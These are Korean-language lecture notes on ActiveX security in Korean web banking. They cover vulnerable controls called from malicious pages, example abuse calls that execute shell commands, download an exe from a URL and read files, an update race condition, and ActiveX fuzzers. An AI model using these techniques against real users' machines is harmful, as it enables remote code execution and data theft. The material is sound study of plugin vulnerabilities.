ole + com = active x

internet explorer : 

엑티브 엑스를 타 언어에서 실행시킬 수 있음

인자 전달 방식
1.
	obj1.callmethod('hellsonic', 'ccc', 1);

2.
<object id = 'obj1' classid = '~'>
	<param ~>
	<param ~>
</object>

	obj1.callmethod();

설계상 자바스크립트는 exe 를 이길 수 없음
-> js 만으로 커널단의 키보드 보안, 화면 보안을 할 수 없음

한구의 KI 기술을 무시할 수 없음, 굉장히 고려해야할 점이 많음
완전히 다른 방식으로 바꾼다는 것을 고려하지 못하는 이유이기도 함
암호화 모듈과 같은 것도 JS 로 포팅할 수 없음 -> activex 로 사용 (현재는 많이 대체됨 )

취약점이 존재하는 ActiveX 가 설치 된 PC -> 악성 URL 로 유도
개인 타겟을 이용한 공격

취약점이 존재하는 ActiveX 가 설치 된 PC -> 사용자들이 많이 방문하는 홈페이지의 iframe 을 통해 감염
PC -> A에서만 호출 되야 할 ActiveX 가 어디서든 호출 가능 : 가장 큰 문제 
 => 악성 페이지에서 호출이 됬는지 정상 페이지에서 호출이 됬는지 분간이 어려움

2년전만 해도 active x 가 shell 을 실행할 수 있었음 : ViewerX.Execute('netstat -an');
ViewerX.DOwnloadFromURL('https://blabla.com/a.exe', 'C:/a.exe'); 와 같은 편의를 위한 함수이지만, 취약점이 크게 발생
ViewX.ReadFile('C:/read.txt'); 파일을 읽을 수 있음 ( + write delete)
registry read write delete

서비스를 이용하는 다수의 보안 프로그램 설치를 요구 -> 설치하지 않으면 서비스를 이용하지 못하므로 모두 설치 해야됨 
무조건 예를 눌러 설치하는 것은 힘듬

race condition 발견도 가능 
ViewerX.CheckUpdate("http://www.com/a.exe');
ViewerX.Run('a.exe');
checkupdate : tmp 파일에 떨군후 인증서와 같은 검사를 함 -> 삭제 
run : 실행 =====> 삭제와 실행이 동시 실행 , race condition

update url 이 언제 바뀔지 모르기 때문에, 
ViewerX.CheckUpdate('http://update.kr/viewer.ini') 를 통해 정보를 받아와 업데이트 
-> 자체 검사 루틴이 존재하지 않으면 위조시 확인할 수 없음

Fuzzing::ComRaider - DLL 불러와서 Fuzzing - BOF 외의 다른 취약점을 찾을 수 없음
AxMan - Java sciprt 로 구현, class id 에 object id 를 넣으면 막 돌면서 bof 를 찾음 : crash 를 내기만 할 뿐 로깅 기능을 하지 않음
dranzer - bof 밖에 못찾기는 하지만, exception 과 로깅 기능이 모두 존재 : user interaction 이 불필요
	g 옵션을 통해 파일 떨궈 인풋으로 주면 알아서 돔

COM 기반이기 떄문에 Method 주소가 직관적으로 보이지 않음
attach internet explorer 해서 dispcallfunction 에서 ecx 에 걸린놈이 함수 주소

천송이 코트 사건으로 이해 active x 의무 설치 규정을 폐지

active x 이후에는 exe 파일을 배포 -> 사용자는 수동으로 설치
해결된 문제 : 오픈앱을 사용 - 브라우져 상관 없이 가능
하지만, OS 를 넘지는 못함

exe 와 explorer 의 통신 : 자체 웹 서버, custom uri scheme, web socket 기술로 통신


custom uri scheme : registry : root : uri shceme name : shell : open : command 
kakaotalk://url ~&param= 
이라면 root 아래 kakatalk 폴더에서 command 를 타고 가 실행하게 됨
but 사용자 마음대로 직접 호출이 가능하고, 버그가 발생할 수 있음
결과값을 받아오기 매우 힘듬

web socket : corss-origin resource sharing 을 활용한 IE 와 localhost 의 웹서버와 통신
크로스 도메인이라는 문제 발생 
+ 해킹할 때 web socket 으로 보안 중지를 요청하면 무용지물
JSONP 를 이용한 통신도 가능
http5 웹소켓을 통한 통신도 가능

exe 파일 안했으면 좋겠다
js 랑 full html5 로 만들었으면 좋겠다
-> 두 기술을 이용해 공인인증서 관리 가상 키보드 구현
-> 익스플로러가 html 과 js 만 지원한다면 가능
-> 공인인증서 관리 : 로컬 스토리지 (브라우져 내부 저장소)
-> 가상 키보드 : full js 를 사용하여 구현 
but 키보드나 자바 스크립트만으로는 키보드 보안을 할 수 없다. (js 로 user level 프로그램을 관리할 수 없음 )

스마트폰을 이용한 확인 : FIDO fast identity online 이용
PIN 인증서 지문 안면 홍채 -> 서버 -> 간편인증

온라인 상품 구매 -> QR 코드 스캔을 통한 스마트폰 인증 -> 등록된 카드로 결제
편리함 증가 -> 보안성 감소